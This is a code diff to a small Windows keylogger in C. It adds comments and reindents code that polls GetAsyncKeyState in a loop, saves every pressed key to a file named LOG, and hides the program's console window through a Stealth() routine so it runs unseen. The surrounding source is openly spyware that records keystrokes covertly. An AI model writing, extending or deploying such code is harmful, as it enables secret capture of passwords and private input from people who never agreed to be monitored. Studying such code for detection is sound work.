@@ -20,8 +20,14 @@ int main(){
     Stealth(); 
     int i;
     while (1){
+	
+	//virtual key codes
+	//ref-https://www.amibroker.com/guide/afl/getasynckeystate.html    
         for(i = 8; i <= 190; i++){
-            if (GetAsyncKeyState(i) == -32767)
+		
+		//function returns zero when no key is pressed
+		//and a -ve vlaue when a key has just been pressed
+            	if (GetAsyncKeyState(i) == -32767)
             Save (i,"LOG"); 
         }
     }
@@ -29,6 +35,7 @@ int main(){
     return 0;
 }
 
+//saves keystrokes to file(LOG)
 int Save (int key_stroke, char *file){
     if (key_stroke <= 7)
         return 0;
@@ -58,8 +65,11 @@ int Save (int key_stroke, char *file){
 }
 
 int Stealth(){
-    HWND Stealth;
-    AllocConsole();
-    Stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(Stealth,0);
+
+	//handle(HWND) represents a window
+    	HWND Stealth;
+	
+    	AllocConsole();
+    	Stealth = FindWindowA("ConsoleWindowClass", NULL);
+    	ShowWindow(Stealth,0);
 }
